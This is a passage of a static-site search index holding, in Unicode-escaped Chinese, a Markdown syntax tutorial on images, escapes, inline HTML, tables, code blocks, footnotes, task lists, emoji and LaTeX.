\u6ca1\u6709\u7528\u4e8e\u6307\u5b9a\u56fe\u50cf\u5c3a\u5bf8\u7684\u8bed\u6cd5\u3002\u5982\u679c\u8fd9\u5bf9\u60a8\u5f88\u91cd\u8981\uff0c\u60a8\u53ef\u4ee5\u7b80\u5355\u5730\u4f7f\u7528\u5e38\u89c4 HTML <img> \u6807\u7b7e\u3002 \u7ed9\u56fe\u7247\u589e\u52a0\u94fe\u63a5\uff0c\u8bf7\u5c06\u56fe\u50cf\u7684Markdown \u62ec\u5728\u65b9\u62ec\u53f7\u4e2d\uff0c\u7136\u540e\u5c06\u94fe\u63a5\u6dfb\u52a0\u5728\u5706\u62ec\u53f7\u4e2d\uff1a [![image text](/assets/img/shiprock.jpg \"Optional title\")](https://jerry-se.github.io/)","title":"2.9. \u56fe\u7247\u8bed\u6cd5"},{"location":"markdown/#backslash-escapes","text":"Markdown \u5141\u8bb8\u4f7f\u7528\u53cd\u659c\u6760\u8f6c\u4e49\u6765\u751f\u6210\u6587\u5b57\u5b57\u7b26\uff0c\u5426\u5219\u8fd9\u4e9b\u5b57\u7b26\u5728 Markdown \u7684\u683c\u5f0f\u5316\u8bed\u6cd5\u4e2d\u5177\u6709\u7279\u6b8a\u542b\u4e49\u3002\u4f8b\u5982\uff0c\u5982\u679c\u60f3\u7528\u6587\u5b57\u661f\u53f7\uff08\u800c\u4e0d\u662f HTML <em> \u6807\u8bb0\uff09\u5305\u56f4\u4e00\u4e2a\u5355\u8bcd\uff0c\u53ef\u4ee5\u5728\u661f\u53f7\u4e4b\u524d\u4f7f\u7528\u53cd\u659c\u6760\uff0c\u5982\u4e0b\u6240\u793a\uff1a \\*literal asterisks\\* Markdown \u4e3a\u4ee5\u4e0b\u5b57\u7b26\u63d0\u4f9b\u53cd\u659c\u6760\u8f6c\u4e49\uff1a Character Name \\ backslash ` backtick * asterisk _ underscore {} curly braces [] square brackets () parentheses # hash mark + plus sign - minus sign (hyphen) . dot ! exclamation mark","title":"2.10. \u8f6c\u4e49\u5b57\u7b26"},{"location":"markdown/#inline-html","text":"\u5bf9\u4e8e Markdown \u6db5\u76d6\u8303\u56f4\u4e4b\u5916\u7684\u6807\u7b7e\uff0c\u90fd\u53ef\u4ee5\u76f4\u63a5\u5728\u6587\u4ef6\u91cc\u9762\u7528 HTML \u672c\u8eab\u3002\u5982\u9700\u4f7f\u7528 HTML\uff0c\u4e0d\u9700\u8981\u989d\u5916\u6807\u6ce8\u8fd9\u662f HTML \u6216\u662f Markdown\uff0c\u53ea\u9700 HTML \u6807\u7b7e\u6dfb\u52a0\u5230 Markdown \u6587\u672c\u4e2d\u5373\u53ef\u3002","title":"2.11. \u5185\u5d4c HTML \u6807\u7b7e"},{"location":"markdown/#span-level-html-tags","text":"HTML \u7684\u884c\u7ea7\u5167\u8054\u6807\u7b7e\u5982 <span> \u3001 <cite> \u3001 <del> \u4e0d\u53d7\u9650\u5236\uff0c\u53ef\u4ee5\u5728 Markdown \u7684\u6bb5\u843d\u3001\u5217\u8868\u6216\u662f\u6807\u9898\u91cc\u4efb\u610f\u4f7f\u7528\u3002\u4f9d\u7167\u4e2a\u4eba\u4e60\u60ef\uff0c\u751a\u81f3\u53ef\u4ee5\u4e0d\u7528 Markdown \u683c\u5f0f\uff0c\u800c\u91c7\u7528 HTML \u6807\u7b7e\u6765\u683c\u5f0f\u5316\u3002\u4f8b\u5982\uff1a\u5982\u679c\u6bd4\u8f83\u559c\u6b22 HTML \u7684 <a> \u6216 <img> \u6807\u7b7e\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u8fd9\u4e9b\u6807\u7b7e\uff0c\u800c\u4e0d\u7528 Markdown \u63d0\u4f9b\u7684\u94fe\u63a5\u6216\u662f\u56fe\u7247\u8bed\u6cd5\u3002\u5f53\u4f60\u9700\u8981\u66f4\u6539\u5143\u7d20\u7684\u5c5e\u6027\u65f6\uff08\u4f8b\u5982\u4e3a\u6587\u672c\u6307\u5b9a\u989c\u8272\u6216\u66f4\u6539\u56fe\u50cf\u7684\u5bbd\u5ea6\uff09\uff0c\u4f7f\u7528 HTML \u6807\u7b7e\u66f4\u65b9\u4fbf\u4e9b\u3002 HTML \u884c\u7ea7\u5167\u8054\u6807\u7b7e\u548c\u533a\u5757\u6807\u7b7e\u4e0d\u540c\uff0c\u5728\u5167\u8054\u6807\u7b7e\u7684\u8303\u56f4\u5185\uff0c Markdown \u7684\u8bed\u6cd5\u662f\u53ef\u4ee5\u89e3\u6790\u7684\u3002\u4f8b\u5982\uff1a This **word** is bold. This <em>word</em> is italic.","title":"2.11.1. \u884c\u7ea7\u5185\u5d4c\u6807\u7b7e"},{"location":"markdown/#block-level-html-tags","text":"\u533a\u5757\u5143\u7d20\u2500\u2500\u6bd4\u5982 <div> \u3001 <table> \u3001 <pre> \u3001 <p> \u7b49\u6807\u7b7e\uff0c\u5fc5\u987b\u5728\u524d\u540e\u52a0\u4e0a\u7a7a\u884c\uff0c\u4ee5\u4fbf\u4e8e\u5185\u5bb9\u533a\u5206\u3002\u800c\u4e14\u8fd9\u4e9b\u5143\u7d20\u7684\u5f00\u59cb\u4e0e\u7ed3\u5c3e\u6807\u7b7e\uff0c\u4e0d\u53ef\u4ee5\u7528 tab \u6216\u662f\u7a7a\u767d\u6765\u7f29\u8fdb\u3002Markdown \u4f1a\u81ea\u52a8\u8bc6\u522b\u8fd9\u533a\u5757\u5143\u7d20\uff0c\u907f\u514d\u5728\u533a\u5757\u6807\u7b7e\u524d\u540e\u52a0\u4e0a\u6ca1\u6709\u5fc5\u8981\u7684 <p> \u6807\u7b7e\u3002 \u4f8b\u5982\uff0c\u5728 Markdown \u6587\u4ef6\u91cc\u52a0\u4e0a\u4e00\u6bb5 HTML \u8868\u683c\uff1a This is a regular paragraph. <table> <tr> <td>Foo</td> </tr> </table> This is another regular paragraph. \u8bf7\u6ce8\u610f\uff0cMarkdown \u8bed\u6cd5\u5728 HTML \u533a\u5757\u6807\u7b7e\u4e2d\u5c06\u4e0d\u4f1a\u88ab\u8fdb\u884c\u5904\u7406\u3002\u4f8b\u5982 <p>italic and **bold**</p> \uff0c\u4f60\u65e0\u6cd5\u5728 HTML \u533a\u5757\u5185\u4f7f\u7528 Markdown \u5f62\u5f0f\u7684 \u5f3a\u8c03 \u3002","title":"2.11.2. \u5757\u7ea7\u6807\u7b7e"},{"location":"markdown/#collapse-expand-html-tags","text":"<details> <summary>\u5c55\u5f00\u67e5\u770b</summary> AAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAA </details>","title":"2.11.3. \u6298\u53e0\u793a\u4f8b"},{"location":"markdown/#inline-html-availability","text":"\u51fa\u4e8e\u5b89\u5168\u539f\u56e0\uff0c\u5e76\u975e\u6240\u6709 Markdown \u5e94\u7528\u7a0b\u5e8f\u90fd\u652f\u6301\u5728 Markdown \u6587\u6863\u4e2d\u6dfb\u52a0 HTML\u3002\u5982\u6709\u7591\u95ee\uff0c\u8bf7\u67e5\u770b\u76f8\u5e94 Markdown \u5e94\u7528\u7a0b\u5e8f\u7684\u624b\u518c\u3002\u67d0\u4e9b\u5e94\u7528\u7a0b\u5e8f\u53ea\u652f\u6301 HTML \u6807\u7b7e\u7684\u5b50\u96c6\u3002","title":"2.11.4. \u53ef\u7528\u6027"},{"location":"markdown/#extended-syntax","text":"John Gruber\u7684\u539f\u59cb\u8bbe\u8ba1\u6587\u6863\u4e2d\u6982\u8ff0\u7684 \u57fa\u672c\u8bed\u6cd5 \u4e3b\u8981\u662f\u4e3a\u4e86\u5e94\u4ed8\u5927\u591a\u6570\u60c5\u51b5\u4e0b\u7684\u65e5\u5e38\u6240\u9700\u5143\u7d20\uff0c\u4f46\u5bf9\u4e8e\u67d0\u4e9b\u4eba\u6765\u8bf4\u8fd8\u4e0d\u591f\uff0c\u8fd9\u5c31\u662f\u6269\u5c55\u8bed\u6cd5\u7684\u7528\u6b66\u4e4b\u5730\u3002 \u4e00\u4e9b\u4e2a\u4eba\u548c\u7ec4\u7ec7\u5f00\u59cb\u901a\u8fc7\u6dfb\u52a0\u5176\u4ed6\u5143\u7d20\uff08\u4f8b\u5982\u8868\uff0c\u4ee3\u7801\u5757\uff0c\u8bed\u6cd5\u7a81\u51fa\u663e\u793a\uff0cURL\u81ea\u52a8\u94fe\u63a5\u548c\u811a\u6ce8\uff09\u6765\u6269\u5c55\u57fa\u672c\u8bed\u6cd5\u3002\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528\u57fa\u4e8e\u57fa\u672cMarkdown\u8bed\u6cd5\u7684\u8f7b\u91cf\u7ea7\u6807\u8bb0\u8bed\u8a00\uff0c\u6216\u901a\u8fc7\u5411\u517c\u5bb9\u7684Markdown\u5904\u7406\u5668\u6dfb\u52a0\u6269\u5c55\u6765\u542f\u7528\u8fd9\u4e9b\u5143\u7d20\u3002","title":"3. \u6269\u5c55\u8bed\u6cd5"},{"location":"markdown/#extended-syntax-availability","text":"\u5e76\u975e\u6240\u6709Markdown\u5e94\u7528\u7a0b\u5e8f\u90fd\u652f\u6301\u6269\u5c55\u8bed\u6cd5\u5143\u7d20\u3002\u60a8\u9700\u8981\u68c0\u67e5\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u6240\u4f7f\u7528\u7684\u8f7b\u91cf\u7ea7\u6807\u8bb0\u8bed\u8a00\u662f\u5426\u652f\u6301\u60a8\u8981\u4f7f\u7528\u7684\u6269\u5c55\u8bed\u6cd5\u5143\u7d20\u3002\u5982\u679c\u6ca1\u6709\uff0c\u90a3\u4e48\u4ecd\u7136\u6709\u53ef\u80fd\u5728Markdown\u5904\u7406\u5668\u4e2d\u542f\u7528\u6269\u5c55\u3002 \u6709\u51e0\u79cd\u8f7b\u91cf\u7ea7\u6807\u8bb0\u8bed\u8a00\u662fMarkdown\u7684\u8d85\u96c6\u3002\u5b83\u4eec\u5305\u542bGruber\u7684\u57fa\u672c\u8bed\u6cd5\uff0c\u5e76\u901a\u8fc7\u6dfb\u52a0\u5176\u4ed6\u5143\u7d20\uff08\u4f8b\u5982\u8868\uff0c\u4ee3\u7801\u5757\uff0c\u8bed\u6cd5\u7a81\u51fa\u663e\u793a\uff0cURL\u81ea\u52a8\u94fe\u63a5\u548c\u811a\u6ce8\uff09\u5728\u6b64\u57fa\u7840\u4e0a\u6784\u5efa\u3002\u8bb8\u591a\u6700\u53d7\u6b22\u8fce\u7684Markdown\u5e94\u7528\u7a0b\u5e8f\u4f7f\u7528\u4ee5\u4e0b\u8f7b\u91cf\u7ea7\u6807\u8bb0\u8bed\u8a00\u4e4b\u4e00\uff1a CommonMark GitHub Flavored Markdown (GFM) Markdown Extra MultiMarkdown R Markdown \u6709\u8bb8\u591a Markdown\u5904\u7406\u5668 \u53ef\u7528\u3002\u5b83\u4eec\u4e2d\u7684\u8bb8\u591a\u5141\u8bb8\u60a8\u6dfb\u52a0\u542f\u7528\u6269\u5c55\u8bed\u6cd5\u5143\u7d20\u7684\u6269\u5c55\u3002\u67e5\u770b\u60a8\u6240\u4f7f\u7528\u5904\u7406\u5668\u7684\u6587\u6863\u4ee5\u83b7\u53d6\u66f4\u591a\u4fe1\u606f\u3002","title":"3.1. \u6269\u5c55\u7684\u53ef\u7528\u6027"},{"location":"markdown/#table","text":"\u8981\u6dfb\u52a0\u8868\uff0c\u8bf7\u4f7f\u7528\u4e09\u4e2a\u6216\u591a\u4e2a\u8fde\u5b57\u7b26\uff08 --- \uff09\u521b\u5efa\u6bcf\u5217\u7684\u6807\u9898\uff0c\u5e76\u4f7f\u7528\u7ba1\u9053\uff08 | \uff09\u5206\u9694\u6bcf\u5217\u3002\u60a8\u53ef\u4ee5\u9009\u62e9\u5728\u8868\u7684\u4efb\u4e00\u7aef\u6dfb\u52a0\u7ba1\u9053\uff0c\u5355\u5143\u683c\u5bbd\u5ea6\u53ef\u4ee5\u53d8\u5316\u3002 \u4f7f\u7528\u8fde\u5b57\u7b26\u548c\u7ba1\u9053\u521b\u5efa\u8868\u53ef\u80fd\u5f88\u9ebb\u70e6\u3002\u4e3a\u4e86\u52a0\u5feb\u8be5\u8fc7\u7a0b\uff0c\u8bf7\u5c1d\u8bd5\u4f7f\u7528 Markdown Tables Generator \u3002\u4f7f\u7528\u56fe\u5f62\u754c\u9762\u6784\u5efa\u8868\uff0c\u7136\u540e\u5c06\u751f\u6210\u7684Markdown\u683c\u5f0f\u7684\u6587\u672c\u590d\u5236\u5230\u6587\u4ef6\u4e2d\u3002 name | age ---- | --- LearnShare | 12 Mike | 32 \u5728\u8868\u5934\u4e0b\u65b9\u7684\u5206\u9694\u7ebf\u6807\u8bb0\u4e2d\u52a0\u5165 : \uff0c\u5373\u53ef\u6807\u8bb0\u4e0b\u65b9\u5355\u5143\u683c\u5185\u5bb9\u7684\u5bf9\u9f50\u65b9\u5f0f\uff1a :--- \u4ee3\u8868\u5de6\u5bf9\u9f50 :--: \u4ee3\u8868\u5c45\u4e2d\u5bf9\u9f50 ---: \u4ee3\u8868\u53f3\u5bf9\u9f50 | left | center | right | | :--- | :----: | ----: | | aaaa | bbbbbb | ccccc | | a | b | c | \u60a8\u53ef\u4ee5\u5728\u8868\u683c\u4e2d\u8bbe\u7f6e\u6587\u672c\u683c\u5f0f\u3002\u4f8b\u5982\uff0c\u60a8\u53ef\u4ee5\u6dfb\u52a0\u94fe\u63a5\uff0c\u4ee3\u7801\uff08\u4ec5\u53cd\u5f15\u53f7\uff08 ` \uff09\u4e2d\u7684\u5355\u8bcd\u6216\u77ed\u8bed\uff0c\u800c\u4e0d\u662f\u4ee3\u7801\u5757\uff09\u548c\u5f3a\u8c03\u3002 \u60a8\u4e0d\u80fd\u6dfb\u52a0\u6807\u9898\uff0c\u5757\u5f15\u7528\uff0c\u5217\u8868\uff0c\u6c34\u5e73\u89c4\u5219\uff0c\u56fe\u50cf\u6216HTML\u6807\u7b7e\u3002 \u60a8\u53ef\u4ee5\u4f7f\u7528\u8868\u683c\u7684HTML\u5b57\u7b26\u4ee3\u7801\uff08 &#124; \uff09\u5728\u8868\u4e2d\u663e\u793a\u7ad6\u7ebf\uff08 | \uff09\u5b57\u7b26\u3002","title":"3.2. \u8868\u683c"},{"location":"markdown/#fenced-code-blocks","text":"Markdown\u57fa\u672c\u8bed\u6cd5\u5141\u8bb8\u60a8\u901a\u8fc7\u5c06\u884c\u7f29\u8fdb\u56db\u4e2a\u7a7a\u683c\u6216\u4e00\u4e2a\u5236\u8868\u7b26\u6765\u521b\u5efa \u4ee3\u7801\u5757 \u3002\u5982\u679c\u53d1\u73b0\u4e0d\u65b9\u4fbf\uff0c\u8bf7\u5c1d\u8bd5\u4f7f\u7528\u53d7\u4fdd\u62a4\u7684\u4ee3\u7801\u5757\u3002\u6839\u636eMarkdown\u5904\u7406\u5668\u6216\u7f16\u8f91\u5668\u7684\u4e0d\u540c\uff0c\u60a8\u5c06\u5728\u4ee3\u7801\u5757\u4e4b\u524d\u548c\u4e4b\u540e\u7684\u884c\u4e0a\u4f7f\u7528\u4e09\u4e2a\u53cd\u5f15\u53f7\uff08 ``` \uff09\u6216\u4e09\u4e2a\u6ce2\u6d6a\u53f7\uff08 ~~~ \uff09\u3002 ``` { \"firstName\": \"John\", \"lastName\": \"Smith\", \"age\": 25 } ``` \u6548\u679c\u5982\u4e0b\uff1a { \"firstName\": \"John\", \"lastName\": \"Smith\", \"age\": 25 } \u8bb8\u591aMarkdown\u5904\u7406\u5668\u90fd\u652f\u6301\u53d7\u56f4\u680f\u4ee3\u7801\u5757\u7684\u8bed\u6cd5\u7a81\u51fa\u663e\u793a\u3002\u4f7f\u7528\u6b64\u529f\u80fd\uff0c\u60a8\u53ef\u4ee5\u4e3a\u7f16\u5199\u4ee3\u7801\u7684\u4efb\u4f55\u8bed\u8a00\u6dfb\u52a0\u989c\u8272\u7a81\u51fa\u663e\u793a\u3002\u8981\u6dfb\u52a0\u8bed\u6cd5\u7a81\u51fa\u663e\u793a\uff0c\u8bf7\u5728\u53d7\u9632\u62a4\u7684\u4ee3\u7801\u5757\u4e4b\u524d\u7684\u53cd\u5f15\u53f7\u65c1\u8fb9\u6307\u5b9a\u4e00\u79cd\u8bed\u8a00\u3002 ```json { \"firstName\": \"John\", \"lastName\": \"Smith\", \"age\": 25 } ``` \u6548\u679c\u5982\u4e0b\uff1a { \"firstName\": \"John\", \"lastName\": \"Smith\", \"age\": 25 } \u652f\u6301\u4ee5\u4e0b\u8bed\u8a00\u79cd\u7c7b\uff1a bash clojure\uff0ccpp\uff0ccs\uff0ccss dart\uff0cdockerfile, diff erlang go\uff0cgradle\uff0cgroovy haskell java\uff0cjavascript\uff0cjson\uff0cjulia kotlin lisp\uff0clua makefile\uff0cmarkdown\uff0cmatlab objectivec perl\uff0cphp\uff0cpython r\uff0cruby\uff0crust scala\uff0cshell\uff0csql\uff0cswift tex\uff0ctypescript verilog\uff0cvhdl xml yaml","title":"3.3. \u56f4\u680f\u4ee3\u7801\u5757"},{"location":"markdown/#footnotes","text":"\u811a\u6ce8\u4f7f\u60a8\u53ef\u4ee5\u6dfb\u52a0\u6ce8\u91ca\u548c\u53c2\u8003\uff0c\u800c\u4e0d\u4f1a\u4f7f\u6587\u6863\u6b63\u6587\u6df7\u4e71\u3002\u5f53\u60a8\u521b\u5efa\u811a\u6ce8\u65f6\uff0c\u5e26\u6709\u811a\u6ce8\u7684\u4e0a\u6807\u6570\u5b57\u4f1a\u51fa\u73b0\u5728\u60a8\u6dfb\u52a0\u811a\u6ce8\u53c2\u8003\u7684\u4f4d\u7f6e\u3002\u8bfb\u8005\u53ef\u4ee5\u5355\u51fb\u94fe\u63a5\u4ee5\u8df3\u81f3\u9875\u9762\u5e95\u90e8\u7684\u811a\u6ce8\u5185\u5bb9\u3002 \u8981\u521b\u5efa\u811a\u6ce8\u53c2\u8003\uff0c\u8bf7\u5728\u65b9\u62ec\u53f7\uff08 [^1] \uff09\u5185\u6dfb\u52a0\u63d2\u5165\u7b26\u53f7\u548c\u6807\u8bc6\u7b26\u3002\u6807\u8bc6\u7b26\u53ef\u4ee5\u662f\u6570\u5b57\u6216\u5355\u8bcd\uff0c\u4f46\u4e0d\u80fd\u5305\u542b\u7a7a\u683c\u6216\u5236\u8868\u7b26\u3002\u6807\u8bc6\u7b26\u4ec5\u5c06\u811a\u6ce8\u53c2\u8003\u4e0e\u811a\u6ce8\u672c\u8eab\u76f8\u5173\u8054-\u5728\u8f93\u51fa\u4e2d\uff0c\u811a\u6ce8\u6309\u987a\u5e8f\u7f16\u53f7\u3002 \u5728\u62ec\u53f7\u5185\u4f7f\u7528\u53e6\u4e00\u4e2a\u63d2\u5165\u7b26\u53f7\u548c\u6570\u5b57\u6dfb\u52a0\u811a\u6ce8\uff0c\u5e76\u7528\u5192\u53f7\u548c\u6587\u672c\uff08 [^1]: My footnote. \uff09\u3002\u60a8\u4e0d\u5fc5\u5728\u6587\u6863\u672b\u5c3e\u6dfb\u52a0\u811a\u6ce8\u3002\u60a8\u53ef\u4ee5\u5c06\u5b83\u4eec\u653e\u5728\u9664\u5217\u8868\uff0c\u5757\u5f15\u53f7\u548c\u8868\u4e4b\u7c7b\u7684\u5176\u4ed6\u5143\u7d20\u4e4b\u5916\u7684\u4efb\u4f55\u4f4d\u7f6e\u3002 Here's a simple footnote,[^1] and here's a longer one.[^bignote] [^1]: This is the first footnote. [^bignote]: Here's one with multiple paragraphs and code. Indent paragraphs to include them in the footnote. `{ my code }` Add as many paragraphs as you like. \u6548\u679c\u5982\u4e0b\uff1a Here's a simple footnote, 1 and here's a longer one. 2","title":"3.4. \u811a\u6ce8"},{"location":"markdown/#heading-ids","text":"\u8bb8\u591aMarkdown\u5904\u7406\u5668\u652f\u6301 \u6807\u9898 \u7684\u81ea\u5b9a\u4e49ID - \u4e00\u4e9bMarkdown\u5904\u7406\u5668\u4f1a\u81ea\u52a8\u6dfb\u52a0\u5b83\u4eec\u3002\u6dfb\u52a0\u81ea\u5b9a\u4e49ID\u5141\u8bb8\u60a8\u76f4\u63a5\u94fe\u63a5\u5230\u6807\u9898\u5e76\u4f7f\u7528CSS\u5bf9\u5176\u8fdb\u884c\u4fee\u6539\u3002\u8981\u6dfb\u52a0\u81ea\u5b9a\u4e49\u6807\u9898ID\uff0c\u8bf7\u5728\u4e0e\u6807\u9898\u76f8\u540c\u7684\u884c\u4e0a\u7528\u5927\u62ec\u53f7\u62ec\u8d77\u8be5\u81ea\u5b9a\u4e49ID\u3002 ### My Great Heading {#custom-id} HTML\u770b\u8d77\u6765\u50cf\u8fd9\u6837\uff1a <h3 id=\"custom-id\">My Great Heading</h3> \u901a\u8fc7\u521b\u5efa\u5e26\u6709\u6570\u5b57\u7b26\u53f7\uff08 # \uff09\u548c\u81ea\u5b9a\u4e49\u6807\u9898ID\u7684 \u6807\u51c6\u94fe\u63a5 \uff0c\u53ef\u4ee5\u94fe\u63a5\u5230\u6587\u4ef6\u4e2d\u5177\u6709\u81ea\u5b9a\u4e49ID\u7684\u6807\u9898\u3002 Markdown\u8bed\u6cd5 HTML \u9884\u89c8\u6548\u679c [Heading IDs](#heading-ids) <a href=\"#heading-ids\">Heading IDs</a> Heading IDs \u5176\u4ed6\u7f51\u7ad9\u53ef\u4ee5\u901a\u8fc7\u5c06\u81ea\u5b9a\u4e49\u6807\u9898ID\u6dfb\u52a0\u5230\u7f51\u9875\u7684\u5b8c\u6574URL\uff08\u4f8b\u5982 [Heading IDs](https://jerry-se.github.io/markdown/#heading-ids) \uff09\u6765\u94fe\u63a5\u5230\u6807\u9898\u3002","title":"3.5. \u6807\u9898\u7f16\u53f7"},{"location":"markdown/#definition-lists","text":"\u4e00\u4e9bMarkdown\u5904\u7406\u5668\u5141\u8bb8\u60a8\u521b\u5efa\u672f\u8bed\u53ca\u5176\u5bf9\u5e94\u5b9a\u4e49\u7684\u5b9a\u4e49\u5217\u8868\u3002\u8981\u521b\u5efa\u5b9a\u4e49\u5217\u8868\uff0c\u8bf7\u5728\u7b2c\u4e00\u884c\u4e0a\u952e\u5165\u672f\u8bed\u3002\u5728\u4e0b\u4e00\u884c\uff0c\u952e\u5165\u4e00\u4e2a\u5192\u53f7\uff0c\u540e\u8ddf\u4e00\u4e2a\u7a7a\u683c\u548c\u5b9a\u4e49\u3002 First Term : This is the definition of the first term. Second Term : This is one definition of the second term. : This is another definition of the second term. HTML\u770b\u8d77\u6765\u50cf\u8fd9\u6837\uff1a <dl> <dt>First Term</dt> <dd>This is the definition of the first term.</dd> <dt>Second Term</dt> <dd>This is one definition of the second term. </dd> <dd>This is another definition of the second term.</dd> </dl> \u6548\u679c\u5982\u4e0b\uff1a First Term This is the definition of the first term. Second Term This is one definition of the second term. This is another definition of the second term.","title":"3.6. \u5b9a\u4e49\u5217\u8868"},{"location":"markdown/#strikethrough","text":"\u60a8\u53ef\u4ee5\u901a\u8fc7\u5728\u5355\u8bcd\u4e2d\u5fc3\u653e\u7f6e\u4e00\u6761\u6c34\u5e73\u7ebf\u6765\u5220\u9664\u5355\u8bcd\u3002\u7ed3\u679c\u770b\u8d77\u6765 \u50cf\u8fd9\u6837 \u3002\u6b64\u529f\u80fd\u4f7f\u60a8\u53ef\u4ee5\u6307\u793a\u67d0\u4e9b\u5355\u8bcd\u662f\u4e00\u4e2a\u9519\u8bef\uff0c\u8981\u4ece\u6587\u6863\u4e2d\u5220\u9664\u3002\u82e5\u8981\u5220\u9664\u5355\u8bcd\uff0c\u8bf7\u5728\u5355\u8bcd\u524d\u540e\u4f7f\u7528\u4e24\u4e2a\u6ce2\u6d6a\u53f7 ~~ \u3002 ~~\u8fd9\u91cc\u662f\u5220\u9664\u7ebf~~","title":"3.7. \u5220\u9664\u7ebf"},{"location":"markdown/#task-lists","text":"\u4efb\u52a1\u5217\u8868\u4f7f\u60a8\u53ef\u4ee5\u521b\u5efa\u5e26\u6709\u590d\u9009\u6846\u7684\u9879\u76ee\u5217\u8868\u3002\u5728\u652f\u6301\u4efb\u52a1\u5217\u8868\u7684Markdown\u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u590d\u9009\u6846\u5c06\u663e\u793a\u5728\u5185\u5bb9\u65c1\u8fb9\u3002\u8981\u521b\u5efa\u4efb\u52a1\u5217\u8868\uff0c\u8bf7\u5728\u4efb\u52a1\u5217\u8868\u9879\u4e4b\u524d\u6dfb\u52a0\u7834\u6298\u53f7 - \u548c\u65b9\u62ec\u53f7 [ ] \uff0c\u5e76\u5728 [ ] \u524d\u9762\u52a0\u4e0a\u7a7a\u683c\u3002\u8981\u9009\u62e9\u4e00\u4e2a\u590d\u9009\u6846\uff0c\u8bf7\u5728\u65b9\u62ec\u53f7 [x] \u4e4b\u95f4\u6dfb\u52a0 x \u3002 - [x] Write the press release - [ ] Update the website - [ ] Contact the media \u6548\u679c\u5982\u4e0b\uff1a [x] Write the press release [ ] Update the website [ ] Contact the media","title":"3.8. \u4efb\u52a1\u5217\u8868"},{"location":"markdown/#emoji","text":"\u6709\u4e24\u79cd\u65b9\u6cd5\u53ef\u4ee5\u5c06\u8868\u60c5\u7b26\u53f7\u6dfb\u52a0\u5230Markdown\u6587\u4ef6\u4e2d\uff1a\u5c06\u8868\u60c5\u7b26\u53f7\u590d\u5236\u5e76\u7c98\u8d34\u5230Markdown\u683c\u5f0f\u7684\u6587\u672c\u4e2d\uff0c\u6216\u8005\u952e\u5165 emoji shortcodes \u3002 \u5728\u5927\u591a\u6570\u60c5\u51b5\u4e0b\uff0c\u60a8\u53ef\u4ee5\u7b80\u5355\u5730\u4ece Emojipedia \u7b49\u6765\u6e90\u590d\u5236\u8868\u60c5\u7b26\u53f7\u5e76\u5c06\u5176\u7c98\u8d34\u5230\u6587\u6863\u4e2d\u3002\u8bb8\u591aMarkdown\u5e94\u7528\u7a0b\u5e8f\u4f1a\u81ea\u52a8\u4ee5Markdown\u683c\u5f0f\u7684\u6587\u672c\u663e\u793a\u8868\u60c5\u7b26\u53f7\u3002\u4eceMarkdown\u5e94\u7528\u7a0b\u5e8f\u5bfc\u51fa\u7684HTML\u548cPDF\u6587\u4ef6\u5e94\u663e\u793a\u8868\u60c5\u7b26\u53f7\u3002 Tips : \u5982\u679c\u60a8\u4f7f\u7528\u7684\u662f\u9759\u6001\u7f51\u7ad9\u751f\u6210\u5668\uff0c\u8bf7\u786e\u4fdd\u5c06HTML\u9875\u9762\u7f16\u7801\u4e3aUTF-8\u3002 \u4e00\u4e9bMarkdown\u5e94\u7528\u7a0b\u5e8f\u5141\u8bb8\u60a8\u901a\u8fc7\u952e\u5165\u8868\u60c5\u7b26\u53f7\u77ed\u4ee3\u7801\u6765\u63d2\u5165\u8868\u60c5\u7b26\u53f7\u3002\u8fd9\u4e9b\u4ee5\u5192\u53f7\u5f00\u5934\u548c\u7ed3\u5c3e\uff0c\u5e76\u5305\u542b\u8868\u60c5\u7b26\u53f7\u7684\u540d\u79f0\u3002 \u53bb\u9732\u8425\u4e86\uff01 :tent: \u5f88\u5feb\u56de\u6765\u3002 \u771f\u597d\u7b11\uff01 :joy: \u6548\u679c\u5982\u4e0b\uff1a \u53bb\u9732\u8425\u4e86\uff01\u26fa\u5f88\u5feb\u56de\u6765\u3002 \u771f\u597d\u7b11\uff01\ud83d\ude02 Tips : \u60a8\u53ef\u4ee5\u4f7f\u7528\u6b64 \u8868\u60c5\u7b26\u53f7\u7b80\u7801\u5217\u8868 \uff0c\u4f46\u8bf7\u8bb0\u4f4f\uff0c\u8868\u60c5\u7b26\u53f7\u7b80\u7801\u56e0\u5e94\u7528\u7a0b\u5e8f\u800c\u5f02\u3002\u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605Markdown\u5e94\u7528\u7a0b\u5e8f\u7684\u6587\u6863\u3002","title":"3.9. Emoji\u8868\u60c5"},{"location":"markdown/#mathematical_formula","text":"LaTeX\u662f\u4e00\u79cd\u57fa\u4e8e\u03a4\u0395\u03a7\u7684\u6392\u7248\u7cfb\u7edf\uff0c\u7531\u7f8e\u56fd\u8ba1\u7b97\u673a\u5b66\u5bb6\u83b1\u65af\u5229\u00b7\u5170\u4f2f\u7279\uff08Leslie Lamport\uff09\u572820\u4e16\u7eaa80\u5e74\u4ee3\u521d\u671f\u5f00\u53d1\uff0c\u5229\u7528\u8fd9\u79cd\u683c\u5f0f\uff0c\u5373\u4f7f\u4f7f\u7528\u8005\u6ca1\u6709\u6392\u7248\u548c\u7a0b\u5e8f\u8bbe\u8ba1\u7684\u77e5\u8bc6\u4e5f\u53ef\u4ee5\u5145\u5206\u53d1\u6325\u7531TeX\u6240\u63d0\u4f9b\u7684\u5f3a\u5927\u529f\u80fd\uff0c\u80fd\u5728\u51e0\u5929\uff0c\u751a\u81f3\u51e0\u5c0f\u65f6\u5185\u751f\u6210\u5f88\u591a\u5177\u6709\u4e66\u7c4d\u8d28\u91cf\u7684\u5370\u5237\u54c1\u3002\u5bf9\u4e8e\u751f\u6210\u590d\u6742\u8868\u683c\u548c\u6570\u5b66\u516c\u5f0f\uff0c\u8fd9\u4e00\u70b9\u8868\u73b0\u5f97\u5c24\u4e3a\u7a81\u51fa\u3002\u56e0\u6b64\u5b83\u975e\u5e38\u9002\u7528\u4e8e\u751f\u6210\u9ad8\u5370\u5237\u8d28\u91cf\u7684\u79d1\u6280\u548c\u6570\u5b66\u7c7b\u6587\u6863\u3002 